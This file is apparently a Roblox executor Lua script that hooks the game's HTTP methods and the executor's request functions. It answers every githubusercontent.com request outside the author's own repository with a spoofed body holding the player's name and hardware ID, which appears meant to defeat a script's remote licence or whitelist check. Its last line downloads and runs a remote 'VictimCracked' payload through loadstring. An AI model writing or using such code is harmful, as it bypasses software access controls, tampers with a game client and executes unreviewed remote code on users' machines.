local targetUser = "musica777420xdads"
-- The string you want to return instead of the website content
local fakeResponse = game:GetService("Players").LocalPlayer.Name .. ", " .. gethwid()

-- 1. Hook Namecall (game:HttpGet)
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    
    if (method == "HttpGet" or method == "HttpPost") and type(args[1]) == "string" then
        if args[1]:find("githubusercontent.com") and not args[1]:find(targetUser) then
            warn("Bypassed HttpGet. Returning Player Info.")
            return fakeResponse -- We stop the request here and return your string
        end
    end
    return oldNamecall(self, ...)
end)

-- 2. Hook __index (game.HttpGet)
local oldIndex
oldIndex = hookmetamethod(game, "__index", function(self, key)
    if (key == "HttpGet" or key == "HttpPost") then
        return function(instance, url, ...)
            if type(url) == "string" and url:find("githubusercontent.com") and not url:find(targetUser) then
                warn("Bypassed via Index. Returning Player Info.")
                return fakeResponse
            end
            return oldIndex(self, key)(instance, url, ...)
        end
    end
    return oldIndex(self, key)
end)

-- 3. Hook Global Request Functions
local function hookRequest(funcName)
    local original = getgenv()[funcName]
    if original then
        getgenv()[funcName] = function(options)
            if type(options) == "table" and options.Url and options.Url:find("githubusercontent.com") then
                if not options.Url:find(targetUser) then
                    warn("Bypassed " .. funcName .. ". Returning Player Info.")
                    -- Requests usually return a table, so we spoof the Body
                    return {
                        StatusCode = 200,
                        Body = fakeResponse,
                        Headers = {}
                    }
                end
            end
            return original(options)
        end
    end
end

hookRequest("request")
hookRequest("http_request")
if syn then hookRequest("syn.request") end
task.wait(0.5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/musica777420xdads/VictimCracked/refs/heads/main/main"))()
